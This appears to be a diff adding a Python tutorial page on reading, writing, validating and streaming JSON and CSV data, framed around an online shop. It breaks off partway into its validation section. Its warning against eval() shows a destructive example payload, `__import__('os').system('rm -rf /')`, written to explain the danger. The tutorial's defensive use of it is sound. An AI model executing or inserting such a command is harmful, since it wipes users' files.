@@ -1,0 +1,1544 @@
+---
+title: "Working with Data: JSON & CSV"
+description: "Master Python data handling from zero to production: problem-driven progression, safe serialization, custom encoders (datetime, Decimal), Excel BOM handling, atomic writes, streaming generators, security defenses, and end-to-end cleaning pipelines."
+icon: Database
+---
+
+import { Callout } from "fumadocs-ui/components/callout";
+import { Tabs, Tab } from "fumadocs-ui/components/tabs";
+import { Accordion, Accordions } from "fumadocs-ui/components/accordion";
+
+Welcome to the definitive guide on working with data files in Python. This lesson is built on a single organizing principle: **every tool and technique appears only after you have hit the real-world problem it solves.**
+
+---
+
+### The Scenario: Running an Online Shop
+
+Imagine your role: you run a growing online shop.
+
+- **Morning 1 (120 orders):** Your manager sends you orders as a spreadsheet export. A partner website requires that same data formatted so their backend services can ingest it automatically.
+- **Year 2 (2,000,000 orders):** Your shop has expanded. Unattended cron jobs run at 3:00 AM, integrations receive data from international partners with bizarre formatting quirks, and malicious actors attempt CSV injection attacks.
+
+By the end of this guide, you will be able to read, write, validate, stream, and transform both JSON and CSV safely at any scale.
+
+---
+
+## Part 1: Beginner to Intermediate (The 120-Order Shop)
+
+## 1. My Data Vanishes When the Program Stops
+
+You write your first order processing script:
+
+```python
+order = {"id": 1, "customer": "Alice", "total": 149.95, "paid": True, "notes": None}
+```
+
+This dictionary lives in **RAM** (volatile memory). The instant your Python script finishes running, or your computer restarts, the order disappears into thin air. To keep it, you must write it to a **file** on non-volatile disk storage.
+
+A file on disk can only store a sequence of characters (text) or raw bytes. Your first instinct might be to convert the dictionary directly into a string:
+
+```python
+# ❌ The Naive Approach:
+with open("order.txt", "w", encoding="utf-8") as f:
+    f.write(str(order))
+```
+
+The resulting `order.txt` file contains:
+
+```text
+{'id': 1, 'customer': 'Alice', 'total': 149.95, 'paid': True, 'notes': None}
+```
+
+Saving worked. **Loading is where this strategy collapses.** When you read `order.txt` back, Python hands you a raw string:
+
+```python
+with open("order.txt", "r", encoding="utf-8") as f:
+    raw_text = f.read()
+
+# ❌ raw_text is a str, not a dict!
+# raw_text["customer"] raises TypeError: string indices must be integers
+```
+
+The tempting "fix" beginners reach for is `eval(raw_text)`, which executes the text as arbitrary Python code.
+
+<Callout type="error" title="Never Use eval() on Data Files">
+  If an attacker or untrusted user edits <code>order.txt</code> to contain{" "}
+  <code>__import__('os').system('rm -rf /')</code>, calling <code>eval()</code>{" "}
+  will execute that code with your system permissions.{" "}
+  <strong>
+    Never use <code>eval()</code> to load data.
+  </strong>
+</Callout>
+
+What you need is an agreed-upon, safe, standardized format that other programs and external partner websites can read.
+
+### The Solution: JSON
+
+**JSON (JavaScript Object Notation)** is a strict, text-based data exchange format defined by RFC 8259. Its syntax rules are intentionally minimal and strict. This strictness is what makes it universally safe: every language (Python, JavaScript, Go, Rust, Java) can parse it without running code.
+
+> **The Flat-Pack Furniture Analogy:**
+>
+> - **Serialization (`dump` / `dumps`):** Taking apart a dining table and packing it flat into a cardboard box so it fits inside a delivery truck (or a file).
+> - **Deserialization (`load` / `loads`):** Unpacking the box at the destination and assembling it back into a usable table. The blueprint instructions must be exact so the reconstructed table matches the original.
+
+Python's built-in **`json`** module handles both directions:
+
+```python
+import json
+
+order = {
+    "id": 1,
+    "customer": "Alice",
+    "total": 149.95,
+    "paid": True,
+    "notes": None
+}
+
+# 1. Serialize and save to disk:
+with open("order.json", "w", encoding="utf-8") as f:
+    json.dump(order, f, indent=2)
+
+# 2. Read from disk and deserialize:
+with open("order.json", "r", encoding="utf-8") as f:
+    loaded = json.load(f)
+
+print(loaded["customer"])  # 'Alice'
+print(loaded["paid"])      # True (real Python boolean!)
+print(type(loaded))        # <class 'dict'>
+```
+
+The file `order.json` on disk looks like this:
+
+```json
+{
+  "id": 1,
+  "customer": "Alice",
+  "total": 149.95,
+  "paid": true,
+  "notes": null
+}
+```
+
+### Anatomizing the File Code
+
+Three details in the code above are essential:
+
+1. `open("order.json", "w", ...)`: Opens the file in `"w"` (write) mode. **Caution:** this immediately truncates (erases) any existing file with that name! `"r"` opens for reading.
+2. `with ... as f:`: The **context manager**. It guarantees that the operating system file descriptor is flushed and closed properly, even if an unhandled exception or crash happens midway through.
+3. `encoding="utf-8"`: Specifies how characters map to raw bytes. Specifying UTF-8 explicitly avoids platform-dependent bugs (like Windows defaulting to `cp1252`).
+
+### The Python $\leftrightarrow$ JSON Type Mapping
+
+Notice how Python's `True` became `true`, and `None` became `null`. JSON has its own syntax rules:
+
+| Python Type              | JSON Type | Python Example       | JSON Equivalent  |
+| :----------------------- | :-------- | :------------------- | :--------------- |
+| **`dict`**               | Object    | `{"key": "val"}`     | `{"key": "val"}` |
+| **`list`**, **`tuple`**  | Array     | `[1, 2]` or `(1, 2)` | `[1, 2]`         |
+| **`str`**                | String    | `"hello"`            | `"hello"`        |
+| **`int`**, **`float`**   | Number    | `42`, `3.14`         | `42`, `3.14`     |
+| **`True`** / **`False`** | Boolean   | `True` / `False`     | `true` / `false` |
+| **`None`**               | Null      | `None`               | `null`           |
+
+---
+
+## 2. I Need the Text Itself, Not a File
+
+When your shop communicates with a partner's REST API or webhook, data arrives as a raw string over the network—not as a file on disk.
+
+Python's `json` module provides two pairs of functions. **One single letter separates them:**
+
+| Function Pair                                  | Operates On          | Where Data Lives         |
+| :--------------------------------------------- | :------------------- | :----------------------- |
+| **`json.dump(obj, f)`** / **`json.load(f)`**   | File object / Stream | Secondary Storage (Disk) |
+| **`json.dumps(obj)`** / **`json.loads(text)`** | In-memory `str`      | Volatile Memory (RAM)    |
+
+<Callout type="info" title="The Suffix Rule">
+  The trailing{" "}
+  <strong>
+    <code>s</code>
+  </strong>{" "}
+  stands for <strong>String</strong>. Use <code>dumps</code> to{" "}
+  <em>dump to string</em>, and <code>loads</code> to <em>load from string</em>.
+</Callout>
+
+```python
+import json
+
+# 1. Parsing JSON received from an API:
+raw_payload = '{"id": 42, "status": "approved", "tags": ["fast", "cloud"]}'
+parsed = json.loads(raw_payload)
+
+print(parsed["status"])     # 'approved'
+print(parsed["tags"][0])    # 'fast'
+
+# 2. Generating a JSON string to transmit over the network:
+data = {"id": 42, "admin": True, "notes": None}
+serialized = json.dumps(data)
+print(serialized)           # '{"id": 42, "admin": true, "notes": null}'
+```
+
+### Formatting Options: Readability vs. Network Efficiency
+
+By default, `json.dumps()` packs everything onto one line without indentation. You can control its formatting:
+
+<Tabs items={["Pretty-Printing (Debugging & Git)", "Minified (Production APIs)"]}>
+<Tab value="Pretty-Printing (Debugging & Git)">
+
+Use `indent` and `sort_keys=True` when human beings need to inspect the file, or when storing data in Git to keep diffs minimal:
+
+```python
+payload = {"z_index": 10, "color": "blue", "alpha": 0.5}
+
+print(json.dumps(payload, indent=2, sort_keys=True))
+```
+
+Output:
+
+```json
+{
+  "alpha": 0.5,
+  "color": "blue",
+  "z_index": 10
+}
+```
+
+</Tab>
+<Tab value="Minified (Production APIs)">
+
+Every whitespace character consumes network bandwidth. Strip unnecessary spaces using `separators=(",", ":")`:
+
+```python
+payload = {"z_index": 10, "color": "blue", "alpha": 0.5}
+
+# Eliminates spaces after ',' and ':'
+minified = json.dumps(payload, separators=(",", ":"))
+print(minified)
+# Output: {"z_index":10,"color":"blue","alpha":0.5}
+```
+
+</Tab>
+</Tabs>
+
+### Handling Non-ASCII Characters (`ensure_ascii`)
+
+By default, `json.dumps()` escapes all non-ASCII characters into Unicode escape sequences:
+
+```python
+print(json.dumps("café"))                       # "caf\u00e9"
+print(json.dumps("café", ensure_ascii=False))   # "café"
+```
+
+Both outputs are valid JSON. Setting `ensure_ascii=False` keeps the output human-readable and reduces payload size for international text (e.g. Japanese, Arabic, German).
+
+---
+
+## 3. My Program Crashes on Dates and Prices
+
+Real store orders contain order dates and currency values:
+
+```python
+import json
+from datetime import datetime
+
+# ❌ CRASH!
+json.dumps({"created_at": datetime(2026, 10, 21, 9, 30)})
+# TypeError: Object of type datetime is not JSON serializable
+```
+
+This is **not a bug in Python**. The JSON specification (RFC 8259) defines only strings, numbers, booleans, null, arrays, and objects. It has no date type. You must tell Python how you want dates represented. The global industry standard is **ISO 8601** (`"2026-10-21T09:30:00"`), which sorts alphabetically and is parsed reliably across all time zones.
+
+### The `default` Serializer Function
+
+Pass a function to `default=`. Python calls this function whenever it encounters an object type it does not natively understand:
+
+```python
+import json
+from datetime import date, datetime
+from decimal import Decimal
+from uuid import UUID
+
+def to_jsonable(obj):
+    if isinstance(obj, (datetime, date)):
+        return obj.isoformat()
+    if isinstance(obj, Decimal):
+        return str(obj)       # ⚠️ See the Money warning below!
+    if isinstance(obj, UUID):
+        return str(obj)
+    if isinstance(obj, set):
+        return sorted(obj)    # JSON has no sets; a sorted list is deterministic
+    raise TypeError(f"Cannot serialize {type(obj).__name__}")
+
+payload = {
+    "amount": Decimal("149.95"),
+    "created_at": datetime(2026, 10, 21, 9, 30),
+    "tags": {"express", "priority"},
+}
+
+print(json.dumps(payload, default=to_jsonable, indent=2))
+```
+
+Output:
+
+```json
+{
+  "amount": "149.95",
+  "created_at": "2026-10-21T09:30:00",
+  "tags": ["express", "priority"]
+}
+```
+
+<Callout
+  type="warn"
+  title="CRITICAL: Never Convert Currency Decimals to float!"
+>
+  Floating-point numbers cannot represent base-10 decimals exactly due to IEEE
+  754 binary representation: ```python 0.1 + 0.2 # 0.30000000000000004 ``` If
+  you convert a <code>Decimal</code> to a <code>float</code> inside your
+  serializer, you introduce rounding errors into financial calculations.{" "}
+  <strong>
+    Always serialize currency Decimals as exact strings (e.g.{" "}
+    <code>"149.95"</code>).
+  </strong>{" "}
+  When loading it back, reconstruct it with <code>Decimal("149.95")</code>.
+</Callout>
+
+### Reusable Architecture: Custom `JSONEncoder`
+
+If you serialize orders across multiple modules, wrap the conversion logic in a reusable subclass:
+
+```python
+class ShopEncoder(json.JSONEncoder):
+    def default(self, obj):
+        if isinstance(obj, (datetime, date)):
+            return obj.isoformat()
+        if isinstance(obj, Decimal):
+            return str(obj)
+        return super().default(obj)  # Raises standard TypeError for unknown types
+
+json_text = json.dumps(payload, cls=ShopEncoder)
+```
+
+### The Silent Type Mutation Trap
+
+JSON does not raise an error for every type mismatch; some types are quietly altered:
+
+```python
+data = {"coords": (10, 20), 404: "Not Found"}
+result = json.loads(json.dumps(data))
+print(result)
+# {'coords': [10, 20], '404': 'Not Found'}
+```
+
+1. **Tuples become Lists:** JSON only has arrays. `(10, 20)` deserializes as `[10, 20]`.
+2. **Integer Keys become Strings:** JSON object keys **must always be strings**. The integer key `404` becomes the string `'404'`.
+
+---
+
+## 4. Loading Gives Me Text Where I Want Dates
+
+When you load that JSON back from the partner, `created_at` returns as a raw `str`, not a `datetime` object:
+
+```python
+import json
+
+raw = '{"user": "Alice", "created_at": "2026-10-21T09:30:00"}'
+data = json.loads(raw)
+print(type(data["created_at"]))  # <class 'str'>
+```
+
+JSON never includes type metadata telling the parser _"this string represents a timestamp"_. You restore the types yourself using the **`object_hook`** parameter.
+
+`object_hook` receives every dictionary as soon as it is parsed, letting you transform values before returning the final structure:
+
+```python
+from datetime import datetime
+import json
+
+def restore_dates(d: dict) -> dict:
+    for key, value in d.items():
+        if key == "created_at" and isinstance(value, str):
+            d[key] = datetime.fromisoformat(value)
+    return d
+
+data = json.loads(raw, object_hook=restore_dates)
+print(type(data["created_at"]))  # <class 'datetime.datetime'>
+print(data["created_at"].year)   # 2026
+```
+
+<Callout type="warn" title="Beware Blind Date Parsing">
+  Do not try to call <code>datetime.fromisoformat()</code> on every string value
+  in the dictionary! In modern Python, numeric strings like{" "}
+  <code>"20261021"</code> (which might be an order ID or postal code) will be
+  parsed as dates and silently corrupted.{" "}
+  <strong>Always inspect the specific key name.</strong>
+</Callout>
+
+---
+
+## 5. My Manager Only Sends Spreadsheets (CSV Basics)
+
+JSON handles structured records well, but your manager does not send JSON. They export orders from Excel as **CSV (Comma-Separated Values)**:
+
+```csv
+id,product,price
+101,Mechanical Keyboard,129.99
+102,Noise-Cancelling Headphones,249.50
+```
+
+Beginners often attempt to parse CSV using `.split(",")`:
+
+```python
+line = '1,"Smith, John",Admin'
+print(line.split(","))
+# ❌ Output: ['1', '"Smith', ' John"', 'Admin'] (4 broken pieces!)
+```
+
+The comma inside `"Smith, John"` is part of the customer's name, not a column boundary! Correctly handling quotes, escaped characters, and multi-line fields is why Python provides the **`csv`** module.
+
+```python
+import csv
+
+line = '1,"Smith, John",Admin'
+# ✅ Correct CSV parsing:
+print(next(csv.reader([line])))
+# ['1', 'Smith, John', 'Admin'] (3 clean columns!)
+```
+
+### Writing and Reading with `csv.writer` and `csv.reader`
+
+```python
+import csv
+
+rows = [
+    ["id", "product", "price"],
+    [101, "Mechanical Keyboard", 129.99],
+    [102, "Noise-Cancelling Headphones", 249.50],
+]
+
+# 1. Writing to CSV:
+with open("products.csv", "w", newline="", encoding="utf-8") as f:
+    writer = csv.writer(f)
+    writer.writerows(rows)
+
+# 2. Reading from CSV:
+with open("products.csv", "r", newline="", encoding="utf-8") as f:
+    reader = csv.reader(f)
+    header = next(reader)  # Read first row (column headers)
+    for row in reader:
+        print(f"#{row[0]}: {row[1]} costs ${row[2]}")
+```
+
+Output:
+
+```text
+#101: Mechanical Keyboard costs $129.99
+#102: Noise-Cancelling Headphones costs $249.5
+```
+
+### Two Facts Beginners Miss:
+
+1. `249.50` was saved as `249.5` because Python floats drop trailing zeroes.
+2. **Every value read from a CSV is a string.** `row[2]` is the string `"129.99"`, not a number. If you attempt `row[2] * 2`, Python duplicates the string (`"129.99129.99"`). Always cast explicitly: `float(row[2])` or `Decimal(row[2])`.
+
+### The Critical `newline=""` Rule
+
+<Callout type="error" title="The Windows Double-Newline Bug">
+  Always pass <code>newline=""</code> when opening files for reading or writing
+  with the <code>csv</code> module.
+</Callout>
+
+**Why?** The CSV standard requires rows to end in `\r\n` (CRLF). On Windows, Python's default text mode automatically translates any `\n` into `\r\n`.
+
+Without `newline=""`, the writer outputs `\r\n`, which Windows converts into `\r\r\n`. When opened in Microsoft Excel, you get an annoying **blank row between every line of data**!
+
+---
+
+## 6. Someone Reordered the Columns and My Script Broke
+
+In the previous section, we accessed fields by position: `row[1]`.
+
+Two weeks later, your manager inserts a `"sku"` column between `"id"` and `"product"`. Your script doesn't crash—it silently begins printing SKUs where product names used to be.
+
+**Position-based code fails silently. Name-based code does not.**
+
+### Reading with `csv.DictReader`
+
+`csv.DictReader` reads the first row as column headers and yields each subsequent row as an ordered dictionary:
+
+```python
+import csv
+
+with open("products.csv", "r", newline="", encoding="utf-8") as f:
+    reader = csv.DictReader(f)
+    print("Columns:", reader.fieldnames)  # ['id', 'product', 'price']
+
+    for row in reader:
+        # Access by header name!
+        print(row["product"], row["price"])
+```
+
+If your manager reorders the columns, this code continues working flawlessly.
+
+### Writing with `csv.DictWriter`
+
+`csv.DictWriter` provides the mirror image:
+
+```python
+import csv
+
+users = [
+    {"id": 1, "name": "Elena", "role": "Architect"},
+    {"id": 2, "name": "Marcus"},                         # Missing "role"
+    {"id": 3, "name": "Priya", "role": "QA", "age": 30}, # Extra "age"
+]
+
+with open("users.csv", "w", newline="", encoding="utf-8") as f:
+    writer = csv.DictWriter(
+        f,
+        fieldnames=["id", "name", "role"],
+        restval="N/A",          # Fill value for missing keys
+        extrasaction="ignore"   # Safely drop keys not in fieldnames
+    )
+    writer.writeheader()        # Writes: id,name,role
+    writer.writerows(users)
+```
+
+Generated `users.csv`:
+
+```csv
+id,name,role
+1,Elena,Architect
+2,Marcus,N/A
+3,Priya,QA
+```
+
+- Without `restval="N/A"`, Marcus's role would be written as an empty string `""`.
+- Without `extrasaction="ignore"`, row 3 would raise `ValueError: dict contains fields not in fieldnames: 'age'`.
+
+---
+
+## 7. A Partner's File Uses Semicolons & Excel Quirks
+
+Your shop expands to Germany. Your German partner sends orders that your script parses as one single giant column per line.
+
+In many European countries, the comma is the decimal marker (`149,95 €`). To avoid confusion, European spreadsheets separate columns with **semicolons (`;`)**. Other systems use tabs (`.tsv`) or pipes (`|`).
+
+The separator character is the **delimiter**:
+
+```python
+import csv
+
+with open("german_orders.csv", newline="", encoding="utf-8") as f:
+    reader = csv.reader(f, delimiter=";")
+    for row in reader:
+        print(row)
+```
+
+### Quoting Modes
+
+When a field contains commas, semicolons, or line breaks, the CSV writer wraps it in quotation marks. You can configure this behavior:
+
+```python
+import csv
+import sys
+
+row = [2, "Special item, free shipping"]
+
+# Minimal quoting (default): quotes only fields that need it
+csv.writer(sys.stdout).writerow(row)
+# 2,"Special item, free shipping"
+
+# Quote all fields:
+csv.writer(sys.stdout, quoting=csv.QUOTE_ALL).writerow(row)
+# "2","Special item, free shipping"
+```
+
+| Quoting Mode                      | Behavior                                                                                        |
+| :-------------------------------- | :---------------------------------------------------------------------------------------------- |
+| **`csv.QUOTE_MINIMAL`** (Default) | Quotes only fields containing delimiters, quotes, or newlines.                                  |
+| **`csv.QUOTE_ALL`**               | Wraps every field in quotes.                                                                    |
+| **`csv.QUOTE_NONNUMERIC`**        | Quotes all strings; numbers remain unquoted (auto-converts unquoted fields to float when read). |
+| **`csv.QUOTE_NONE`**              | Never quotes; requires `escapechar="\\"` if a field contains the delimiter.                     |
+
+### Sniffing Unknown Delimiters with `csv.Sniffer`
+
+When receiving mystery files where you don't know the delimiter in advance:
+
+```python
+import csv
+
+with open("mystery.txt", newline="", encoding="utf-8") as f:
+    sample = f.read(2048)  # Read a 2KB sample
+    f.seek(0)              # Rewind cursor back to beginning!
+
+    sniffer = csv.Sniffer()
+    dialect = sniffer.sniff(sample)
+    has_header = sniffer.has_header(sample)
+
+    print("Detected delimiter:", repr(dialect.delimiter))  # e.g. ';' or '\t'
+    print("Has header row?:", has_header)
+
+    reader = csv.reader(f, dialect)
+    for row in reader:
+        print(row)
+```
+
+### The Invisible Excel BOM Bug (`utf-8-sig`)
+
+When Microsoft Excel saves a CSV as UTF-8, it frequently prepends an invisible 3-byte marker at the start of the file called a **Byte Order Mark (BOM)** (`\ufeff`).
+
+If you open this file with plain `encoding="utf-8"`:
+
+```python
+reader = csv.DictReader(f)
+# reader.fieldnames is ['\ufeffid', 'product', 'price']
+row["id"]  # ❌ KeyError: 'id'! The key is actually '\ufeffid'
+```
+
+<Callout type="tip" title="The One-Word Fix">
+  Open Excel-generated CSV files with <code>encoding="utf-8-sig"</code>. It
+  automatically strips the BOM if present, and acts as normal UTF-8 if it isn't.
+</Callout>
+
+---
+
+## 8. The Partner Wants JSON, and My Data is Nested
+
+Your partner's server expects orders as JSON. Because CSV values are always strings, you must explicitly cast types during conversion:
+
+```python
+import csv
+import json
+
+def csv_to_json(csv_path: str, json_path: str) -> None:
+    records = []
+    with open(csv_path, newline="", encoding="utf-8-sig") as f:
+        for row in csv.DictReader(f):
+            row["id"] = int(row["id"])
+            # Guard against empty strings: float("") raises ValueError!
+            row["price"] = float(row["price"]) if row["price"] else None
+            records.append(row)
+
+    with open(json_path, "w", encoding="utf-8") as f:
+        json.dump(records, f, indent=2)
+```
+
+### The Reverse Challenge: Flattening Nested JSON to CSV
+
+JSON can nest objects inside objects, but CSV is a flat 2-dimensional grid:
+
+```json
+{ "id": 7, "name": "Lena", "location": { "city": "Berlin", "country": "DE" } }
+```
+
+To export this to CSV, you must **flatten** it by creating dedicated columns for nested values:
+
+```python
+import csv
+import json
+
+def json_to_csv(json_path: str, csv_path: str) -> None:
+    with open(json_path, encoding="utf-8") as f:
+        users = json.load(f)
+
+    with open(csv_path, "w", newline="", encoding="utf-8") as f:
+        writer = csv.DictWriter(f, fieldnames=["user_id", "name", "city", "country"])
+        writer.writeheader()
+
+        for u in users:
+            # ⚠️ 'or {}' is deliberate!
+            # u.get("location", {}) still returns None if JSON has "location": null
+            loc = u.get("location") or {}
+            writer.writerow({
+                "user_id": u.get("id"),
+                "name": u.get("name"),
+                "city": loc.get("city", "N/A"),
+                "country": loc.get("country", "N/A"),
+            })
+```
+
+---
+
+## 9. The File is Too Big to Load (JSON Lines)
+
+`json.load()` reads the entire file into memory before parsing. If your partner sends a **10 GB JSON array** of historical transactions, your script will attempt to allocate 10–15 GB of RAM and crash with an Out-Of-Memory (`MemoryError`) kill signal.
+
+A standard JSON array cannot be parsed incrementally because it is one single entity enclosed in `[...]` that is syntactically invalid until the final closing bracket.
+
+### The Solution: JSON Lines (`.jsonl` / `ndjson`)
+
+In **JSON Lines**, each line of the file is a complete, self-contained, valid JSON object separated by standard `\n`:
+
+```text
+{"id": 1, "query": "learn python", "status": "200"}
+{"id": 2, "query": "json vs csv", "status": "200"}
+{"id": 3, "query": "pathlib tutorial", "status": "404"}
+```
+
+Because each line stands alone, you can process files of **any size** using **constant $O(1)$ memory**:
+
+```python
+import json
+
+# Writing: one json.dumps per line (no indent! records must stay on one line)
+records = [{"id": 1, "val": "a"}, {"id": 2, "val": "b"}]
+with open("orders.jsonl", "w", encoding="utf-8") as f:
+    for rec in records:
+        f.write(json.dumps(rec) + "\n")
+
+# Reading: stream line by line with zero RAM buildup
+failures = 0
+with open("orders.jsonl", "r", encoding="utf-8") as f:
+    for line in f:
+        if not line.strip():  # Skip empty lines
+            continue
+        record = json.loads(line)
+        if record.get("status") == "404":
+            failures += 1
+
+print("Failed requests:", failures)
+```
+
+This is why modern AI training sets (OpenAI, Hugging Face), log engines (Datadog, Elastic), and big data pipelines use JSON Lines. Standard CSV has this same streaming superpower for free.
+
+---
+
+## 10. The File is Broken and I Don't Know Where
+
+Every real data pipeline eventually encounters corrupted input. Remember: JSON is strict—a single trailing comma violates the specification.
+
+```python
+import json
+
+bad_json = '{"name": "Alice", "balance": 150.00, }'
+
+try:
+    json.loads(bad_json)
+except json.JSONDecodeError as err:
+    print(f"Error Message: {err.msg}")
+    print(f"Location     : Line {err.lineno}, Column {err.colno} (Character {err.pos})")
+```
+
+Output:
+
+```text
+Error Message: Expecting property name enclosed in double quotes
+Location     : Line 1, Column 37 (Character 36)
+```
+
+Use `err.lineno` and `err.colno` to pinpoint where bad data entered your pipeline.
+
+### The CSV Troubleshooting Matrix
+
+| Symptom                                         | Root Cause                                         | Solution                                           |
+| :---------------------------------------------- | :------------------------------------------------- | :------------------------------------------------- |
+| **Blank line between every row in Excel**       | Missing `newline=""` in `open()` on Windows        | Add `newline=""` to `open()`.                      |
+| **`KeyError: 'id'` but header looks correct**   | Excel saved with a Byte Order Mark (BOM)           | Use `encoding="utf-8-sig"`.                        |
+| **Entire row parsed into a single column**      | Wrong delimiter (e.g. `;` instead of `,`)          | Specify `delimiter=";"` or use `csv.Sniffer`.      |
+| **`ValueError` converting string to float/int** | Blank cells or text headers in numeric columns     | Check `if row["val"]:` before casting.             |
+| **`UnicodeDecodeError`**                        | File encoded in Windows-1252 or Latin-1, not UTF-8 | Open with `encoding="cp1252"` or inspect encoding. |
+
+---
+
+## 11. Part 1 Big Picture & Practice
+
+Now that you have encountered each problem, the architectural pattern is clear:
+
+| Need                                            | Tool                                                |
+| :---------------------------------------------- | :-------------------------------------------------- |
+| Keep data after the script ends                 | Files on disk (`open`)                              |
+| Agreed, safe format for structured objects      | **JSON**                                            |
+| Work in memory instead of disk files            | `json.dumps` / `json.loads`                         |
+| Types JSON lacks (`datetime`, `Decimal`, `set`) | `default=` / `JSONEncoder` / `object_hook`          |
+| Spreadsheet-style flat tabular data             | **CSV** via `csv` module (never `split`)            |
+| Immune to column reordering                     | `csv.DictReader` / `csv.DictWriter`                 |
+| European delimiters or quotes                   | `delimiter=`, `quoting=`, `csv.Sniffer`             |
+| Files too large for memory                      | **JSON Lines (`.jsonl`)**                           |
+| Malformed syntax or unexpected inputs           | `try/except json.JSONDecodeError`, defensive checks |
+
+### Five Rules to Keep
+
+1. **Always use context managers:** `with open(...)`, specifying `encoding="utf-8"` for JSON and `newline=""` plus encoding for CSV.
+2. **Never parse CSV with `split(",")` and never parse data with `eval()`.**
+3. **Never trust that a CSV value is a number.** Always validate and cast defensively.
+4. **Store currency as strings or `Decimal`, never `float`.**
+5. **Prefer `DictReader` and `DictWriter` over index-based tuples.**
+
+---
+
+### Part 1 Exercises
+
+<Accordions>
+<Accordion title="Exercise 1: Save & Load Orders with Datetimes">
+
+**Problem:**
+Write `save_orders(orders, path)` that saves a list of order dictionaries (each with a `datetime` field `placed_at`) to a JSON file, and `load_orders(path)` that restores `placed_at` as a real `datetime` object.
+
+```python
+import json
+from datetime import datetime
+from pathlib import Path
+
+def save_orders(orders: list[dict], path: str | Path) -> None:
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump(
+            orders,
+            f,
+            indent=2,
+            default=lambda o: o.isoformat() if isinstance(o, datetime) else str(o)
+        )
+
+def load_orders(path: str | Path) -> list[dict]:
+    def hook(d: dict) -> dict:
+        if "placed_at" in d and isinstance(d["placed_at"], str):
+            d["placed_at"] = datetime.fromisoformat(d["placed_at"])
+        return d
+
+    with open(path, "r", encoding="utf-8") as f:
+        return json.load(f, object_hook=hook)
+
+# Verification:
+orders = [{"id": 1, "placed_at": datetime(2026, 10, 21, 14, 0)}]
+save_orders(orders, "test_orders.json")
+loaded = load_orders("test_orders.json")
+assert isinstance(loaded[0]["placed_at"], datetime)
+print("Exercise 1 passed!")
+```
+
+</Accordion>
+
+<Accordion title="Exercise 2: Summing Revenue from CSV with Decimal">
+
+**Problem:**
+A file `sales.csv` has columns `item,qty,unit_price`. Calculate and print the total revenue (`qty * unit_price` summed over all rows). Use `Decimal` to avoid floating point errors.
+
+```python
+import csv
+from decimal import Decimal
+from pathlib import Path
+
+# Create sample CSV
+Path("sales.csv").write_text(
+    "item,qty,unit_price\nWidget A,10,19.95\nWidget B,3,149.50\n",
+    encoding="utf-8"
+)
+
+total_revenue = Decimal("0")
+
+with open("sales.csv", newline="", encoding="utf-8-sig") as f:
+    for row in csv.DictReader(f):
+        qty = int(row["qty"])
+        price = Decimal(row["unit_price"])
+        total_revenue += qty * price
+
+print("Total Revenue:", total_revenue)  # 648.00
+assert total_revenue == Decimal("648.00")
+```
+
+</Accordion>
+
+<Accordion title="Exercise 3: Counting Error Logs in JSONL with Constant Memory">
+
+**Problem:**
+Given a large `.jsonl` log file, count how many records have `"level": "ERROR"` without loading the whole file into RAM.
+
+```python
+import json
+from pathlib import Path
+
+# Create sample logs
+Path("app.jsonl").write_text(
+    '{"level": "INFO", "msg": "started"}\n'
+    '{"level": "ERROR", "msg": "db timeout"}\n'
+    '{"level": "ERROR", "msg": "auth failed"}\n',
+    encoding="utf-8"
+)
+
+error_count = 0
+with open("app.jsonl", "r", encoding="utf-8") as f:
+    for line in f:
+        if line.strip() and json.loads(line).get("level") == "ERROR":
+            error_count += 1
+
+print("Total Errors:", error_count)  # 2
+assert error_count == 2
+```
+
+</Accordion>
+</Accordions>
+
+---
+
+## Part 2: Intermediate to Advanced (Scale, Attacks & 3 A.M. Pipelines)
+
+Part 1 made you competent with 120 orders. Part 2 covers what happens when data becomes **huge, hostile, shared with third-party systems, or mission-critical**. Your shop now handles 2,000,000 historical orders with automated jobs running unattended in production.
+
+---
+
+## 12. The JSON I Received is Technically Valid but Wrong
+
+Just because `json.loads()` does not raise an exception does not mean your data is safe. Four subtle traps catch even experienced software engineers:
+
+### Trap 1: Duplicate Keys are Silently Merged
+
+The official JSON standard (RFC 8259) does not prohibit duplicate keys within an object. By default, Python silently discards all but the last key:
+
+```python
+import json
+
+data = json.loads('{"price": 10.00, "price": 99.00}')
+print(data)  # {'price': 99.00}
+```
+
+If duplicate keys signify a corrupted upstream sender or fraudulent payload, catch them before they collapse into a dictionary using **`object_pairs_hook`**:
+
+```python
+def reject_duplicate_keys(pairs: list[tuple]) -> dict:
+    keys = [k for k, _ in pairs]
+    if len(keys) != len(set(keys)):
+        raise ValueError(f"Duplicate keys detected in JSON object: {keys}")
+    return dict(pairs)
+
+# ❌ Raises ValueError: Duplicate keys detected in JSON object: ['price', 'price']
+json.loads('{"price": 10.00, "price": 99.00}', object_pairs_hook=reject_duplicate_keys)
+```
+
+### Trap 2: `NaN` and `Infinity` are Illegal in RFC 8259
+
+Python's `json` module happily serializes and deserializes IEEE 754 floating-point constants:
+
+```python
+import json
+
+text = json.dumps({"score": float("nan"), "limit": float("inf")})
+print(text)  # {"score": NaN, "limit": Infinity}
+```
+
+While Python accepts this, **`NaN` and `Infinity` are strictly forbidden by the JSON specification**. When a partner's Java, Go, or browser parser attempts to read this payload, it will crash with a syntax error.
+
+<Callout type="tip" title="Use allow_nan=False on Outgoing Data">
+  Pass <code>allow_nan=False</code> when calling <code>json.dumps()</code>. This forces the bug to crash immediately in your own code instead of breaking your partner's systems:
+  ```python
+  json.dumps({"score": float("nan")}, allow_nan=False)
+  # ValueError: Out of range float values are not JSON compliant: nan
+  ```
+</Callout>
+
+### Trap 3: Float Precision Loss on Ingestion
+
+Recall that `149.95` cannot be stored precisely as an IEEE float. If you use standard `json.loads()`, precision is already destroyed the microsecond the string is converted to a float.
+
+Tell Python to construct exact `Decimal` instances directly from raw characters:
+
+```python
+from decimal import Decimal
+import json
+
+payload = '{"amount": 149.95}'
+data = json.loads(payload, parse_float=Decimal)
+
+print(type(data["amount"]))  # <class 'decimal.Decimal'>
+print(data["amount"])        # Decimal('149.95') (Exact!)
+```
+
+### Trap 4: Valid JSON of the Wrong Shape
+
+Your script expects a list of 100 orders, but the partner's API returned `{"error": "rate limited", "retry_after": 60}`. Standard `json.loads()` succeeds without a complaint, and your code crashes four functions later with `TypeError: string indices must be integers`.
+
+This brings us to the most important rule in systems architecture: **validate data at the boundary.**
+
+---
+
+## 13. Validate the Shape of Data at the Door
+
+Treat all incoming JSON and CSV data as **untrusted input**. The professional standard is to validate and parse raw data into strongly-typed objects right at the entry point of your system.
+
+### Boundary Objects with `@dataclass`
+
+```python
+from dataclasses import dataclass, asdict
+from decimal import Decimal
+import json
+
+@dataclass(frozen=True)
